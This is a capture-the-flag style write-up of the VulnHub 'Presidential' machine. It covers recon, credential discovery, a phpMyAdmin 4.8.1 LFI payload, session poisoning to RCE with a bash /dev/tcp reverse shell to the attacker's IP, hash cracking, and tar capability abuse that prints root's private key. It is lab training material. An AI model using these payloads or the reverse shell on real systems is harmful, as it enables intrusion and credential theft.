---
aliases: []
tags:
  - writeup
  - machine
  - vulnhub
  - linux
  - lfi
  - rce
  - reverse-shell
  - phpmyadmin
  - capabilities
machine: Presidential
platform: Linux
difficulty: Medium/Hard
date: 2026-09-24
techniques:
  - phpMyAdmin LFI
  - LFI to RCE
  - tar capability abuse
cve: []
initial vector: Web application and phpMyAdmin
privilege escalation: tarS capability abuse to read root's SSH key
author: null
source: https://www.vulnhub.com/entry/presidential-1,500/
---

- **Presidential 1 machine**: [https://www.vulnhub.com/entry/presidential-1,500/](https://www.vulnhub.com/entry/presidential-1,500/)

## Reconnaissance

We run an *arp-scan* to find the machine's IP, send it a PING, and see the TTL is 64, which tells us it's a Linux machine. *192.168.18.239*

We run an *nmap* against the IP to find the open ports: a stealth scan, min-rate 5000, triple verbose, with no DNS resolution or host discovery.
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.239 -oG allPorts
```
We run a set of basic recon scripts against the open ports and export everything in nmap format to a *targeted* file.
```bash
nmap -sCV -p80,2082 192.168.18.239 -oN targeted
```

Running whatweb against the victim's IP reveals a possible domain *votenow.local* in case there's virtual hosting, so we open *etc/hosts* and add that domain.

We run an nmap with scripts against port 80 of the victim machine.
```bash
nmap --script http-enum -p80 192.168.18.239
```
It reports an */icons* directory but nothing else, so we run gobuster to discover more.
```bash
gobuster dir -u http://192.168.18.239/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20 --add-slash
```
We find the */assets* directory and a */cgi-bin* but nothing more, so we look for subdomains.
```bash
gobuster vhost -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 --append-domain | grep -v "400"
```
The last command reveals *datasafe.votenow.local*, which we add to */etc/hosts*; browsing there we find a *phpMyAdmin* login, but we have no credentials yet. So we search more deeply. We look for files ending in *php* among others and find a config.php that is completely empty, so we search for *php.bak* to find a backup or saved file.
```bash
gobuster dir -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x php,txt,php.bak,bak,tar
```
And finally we find a *config.php.bak* with the password, user, host and name in cleartext.
```php
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```

## Exploitation

### phpMyAdmin LFI to RCE
With these credentials we log into phpMyAdmin; checking the version, it turns out to be *4.8.1*, vulnerable to an LFI and RCE according to searchsploit. We look at the RCE and study what it does so we can run it ourselves.
```python
/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```
With the following line we have an LFI and can point at other files. We try to list the Apache or SSH logs but they don't exist. /proc/net/tcp we can list, though. We save it to a data file.
```bash
 0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18606 1 ffff8b7936e007c0 100 0 0 10 0                     
   1: 00000000:0822 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18508 1 ffff8b7936e00000 100 0 0 10 0                     
   2: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000    27        0 18988 1 ffff8b7936e00f80 100 0 0 10 0                     
   3: EF12A8C0:0050 E212A8C0:A414 06 00000000:00000000 03:0000159A 00000000     0        0 0 3 ffff8b78aa62ab00                                      
   4: EF12A8C0:0050 E212A8C0:AD9E 01 00000000:00000000 02:000B049F 00000000    48        0 376734 2 ffff8b7938055540 102 4 28 10 18                  
   5: EF12A8C0:0050 E212A8C0:CA5C 06 00000000:00000000 03:000015C0 00000000     0        0 0 3 ffff8b78aa62a900
```

With this command we'll see which ports are open: 80, 2082 and, internally, *3306* as well, corresponding to MySQL, which we can enumerate via */proc/sched_debug*.
```bash
for port in $(cat data | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "[+] Port $port -> $((0x$port))"; done
```

Session identifier: viadnld0oeopbg5nl7i0inil09er2fsk
```url
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_viadnld0oeopbg5nl7i0inil09er2fsk
```
Here we can see how to turn the LFI into RCE: if you run a query in the URL above you can see it, and since we're in a PHP resource the site executes it for us.
```php
select '<?php system("bash -i >& /dev/tcp/192.168.18.226/443 0>&1"); ?>';
```
### Reverse shell and credential cracking
The page hangs loading, so we can no longer reach phpMyAdmin and we still have possible passwords there. What we'll do is start a listener again and, from the reverse shell, open another reverse shell in the background. We upgrade the TTY.
```bash
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```
Inside phpMyAdmin, under votebox/users, we find a user and a hash.
```bash
admin:$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
```
We'll crack it. (To find rockyou.txt I had to use sudo find / -name "rockyou.txt*" 2>/dev/null because I couldn't remember the path.)
```bash
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```
The john command takes a while (a long while) to crack it. The result is *Stella*, and with this password we can su to *admin* and enter the directory.

## Privilege escalation
To escalate privileges we look for SUID files, but find nothing interesting. We move on to capabilities.
```bash
find / -perm -4000 2>/dev/null

getcap -r / 2>/dev/null
```
We find a capability that lets us create an archive we can't read, then extract and read it: */usr/bin/tarS*.
So we archive root's key:
```bash
tarS -cvf id_rsa.tar /root/.ssh/id_rsa
tar -xf id_rsa.tar
cd root/
cd .ssh/
cat id_rsa
```
The private key:
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAqCxgVFD0v4dmf8XgX5fKVeZ7V5LcY8hdKTDebvjCtrASgFnQ
hr86LOOdQ1kBaAsrayIZeZu5zd4Vr5CAHrR5OBosvkaURNhxxXyO/Gxf0e5zFDkg
lZD4VKzTcHg0aENL8aIaUAka38PVgFjgrJjuh5wUgjavKA7wXGllRTvrEKMBCVs5
QE4bbaENShTFLd5RBxkhH+Ph9PKgO8+8nkjtn4Rnz1dtqUlvoSO7CdSlQUeMdE8f
p8mkn9IRENfqHL2bIsZvdi4Uz90aeZKBztS7SnxHhiW7V8OKOnoK1iYSokNRJmcZ
wGA1pkW9HJF3PHjNEJnaDRsoHcRwgp/aDr+0l2SgrCj9hahF/xm0fZzTMDcs3Bjs
iiHXkksH/lO/4yJO4kOCiEaj9izpDWiefMLTSh1GjqZoVVpI9fu/JJnTf/oJV3em
6R5TDafIIDga/jxhDEnIaL/LQkw/7DXNB9GwEJQ6LfnPmIhR30V+zSw1YIot6PY9
zh9347jSDVqrr6Sm38fDZ3UdmWmi3/e4zrJOJGn//2NLCgNc8z1/CcRe2yr8uosf
wBgM04HN52PGN3IFzpVYpwYEHwUhb/9S8ZuMvIKxX5ycrmt/r2WlgYYH2gEWk0Y5
BbAyjULgV2XWSBDlplaaL0YRe6++XCGax5MopdUjoon9+Pm4d/uoOdO6/vECAwEA
AQKCAgBTJB07kgpt5fK2mI0ktVZCwX+Y+/IZIqVsB8zv7+vThZif+8cr1r5cEutc
sFQRq/P7MxCFHoftTy5JbZbply+WnNoh96K1powYpkvKX4m/r7MU/GkviEw9EHQ3
1jWSljKlcw6vItE2bwrOOSJaMgE66d75wS83DqumBDUc1VKRFwUcKw1SzUqiGE0J
otsYoiBM8g9+RJshDhJJf5owZr2Tb1IjH4YHe1bEw3VklsxcSZMWrUdpHDdXC/OD
8Dq9mr9nodLZCk8ftJ+yGswyBNnTKT3zBBRqfzGHV26kEI6FyeIEqlQA14+udCva
Q9A/BTncSzOR5yseDE/TRFP5lq0gnmXy1LUL01CDYHIzD60+i0ZWl4fsd/UmYWfK
1Hj098XstE6y9sMX+a41y4BVUn3Mys6bKQ23y8QPzODQSrLPCdCmy7+KyuE4w2wV
XRiofto/1CsbSkKy38apAGc440siNh4V5zXnF1tGvQl+6KuQcZFDXLAcG7QZ3XIw
lCWPU0Zx1Og7hmQACfiMuM6szSxA34bZjd1AnaXq6yn1r3Mq9RAvYMHB64z6xvOD
KO14Bq/XgQ3pEf0+qdAMc89Lq5N4BFna++K63+Ol6LJ8xxv9quU0Db2rO9hMC+fJ
q3c/BsCm0qByAV69jTd6YBmRYA/qnOZrB7Mc5KGTffnynDK/AQKCAQEAz8DYOLY3
dZQ/3Nusy5S+JiZhdgsktbQjn+Ty2fGuYX5nxZ6zUHP0P6a6KjCo6s7m4PS1DHHW
J/Ml42LD9ofW/2A5kk7Qfxec9HCwFuE6+5T4GcAXknOhtwvYupsyY/2rsnO6313d
gpazELlJpwZr2iLl2I8cXAIorBkiVD0vGJmGS/6ld0Yn68JAeZyUw8Ec9h0axKJ8
h+TBvEKjeKnr66Lka416iTVCpmvx01NRe/1duq9vc4ukD8kLsqROtpKeBuhJXV+z
uvqzQVnMOHCZdH2w8Oe7QOfQSQvzccxRvQMstusEyhI7c+yp8En+XNHDX7MPp8NH
EQmE6bQklqHZLQKCAQEAzzp2DQo9kiuQE1ZSorgTT5CDwVv94rUUu3WgbYNKfdot
a9knuTSRkKvDbYkAUj2I95Vv+vusYUUIuUnQ7x92cBtlOZ2zqBzxvQme1SL2hSso
LKi/f8irTxdvld4SBuLE83i7oFsdZgtWfbbBMitYE4WZsrQv9qiB5U9/5cRQT7RP
R7sFIZ9DHJfAmpdQmAIb901ESEKLPz34/JVEFopgE0TQzmaiwCeKICsjvE++/a6y
dXt/4pIja47URuaEmB7g+1QHCALF00vsfp6YqAnALcJ8CVNeddZ+/zxDcAypGdxM
uAacoIbICllpMEXm+KLnqsfd/e4MXUEnKJpR/31PVQKCAQEAzp5RrN10fMjLVwFX
ckVlc5W6WmcsxFX7FDvkV2No9ed8l2uFlN8trNxJzEoGxTivIE3ffhf9UFAff20r
zhU9e1CdEWi3LZ8zZ1xnlOm9+pYmxZ1pFCtSSzVKABT34cBZMaqt0RaOhiEQx/Iv
USEuxIzuoRl7r/oprzd0D+ml3EZb7Vq9/8jTTUMtUoWq4qE+B3vcsnGTfqfBElYI
NKpySzD/EgRsOOeyeMdkg7MamEDdJhzysCzSJyzhKHMHIcbhyabdyDK1EqHhA36m
f/9kbxnOj1k4v42Ndgifvq7hICV3JBjK85l8bYeTX7qHcpLgR15TlJq/JC+ec7vI
o9MlpQKCAQAozkE6th6DrvJS7HefNRIQY8ueAqhOwQuREkuB5Q2BFLpG917cGF7l
lv0Hj6exig5zekivqmk6Sia6na93tsFSuAJJwyUCYJi1ebR+EcFrXaEukhgLaI9b
JqlBYJY6JuNTch24KNj0JB1m6drHL0PLrE4ko1iigHH7npj3vJ135HCMFmafRUYo
1jUF++/RzvCE1QEyHXBgBqsFybq7mYnroWxgiFNZ9S88wGHsDeP0/jaD7cqz6cTx
xBFG2NOZRNNWiihMSod74QJzuHUk+a6PFDHqgDEkkRU22z4ITWXrArdUsXCcJ44y
g4K0D7+4jBOETJEJFJv4rQCx/RlSbvF1AoIBAQCBpyqo2wEXzPvKLjqE4Ph7Cxy7
Z1nlGMp/mFRA5dOXH6CsZWELepVrhh6vlNa93Rq9yg7PLZH8pSv4E5CMmj6eBqLr
ZDcekqPPB31M7UNe8rS0xaBEVApAy0Dx0OiTDcqre+3g2ikIUx3ysStZmt01gTHp
0EgcDlzsmng+qPys8I7VtpUh/XDAKz5m/8b7mEQRQCmduKE7+yqGLKRwdJfq4cJ5
YPChhiv43zowPpuha/akN7Ydl+qi7toMQhvnayX5S2Vb9kl4Fl7JBV5KV16h4Lbw
SeSIdV0ITWhpxuG+K10LN69mYuTAZm6ihc0MM3v4nRtE3UpV74FCkQsTIfKC
-----END RSA PRIVATE KEY-----
```

We connect over SSH on port 2082. **REMEMBER TO TYPE YES.**
```bash
ssh -i id_rsa root@localhost -p 2082
```
![[Pasted image 20260924204735.png|SSH access as root and final flag]]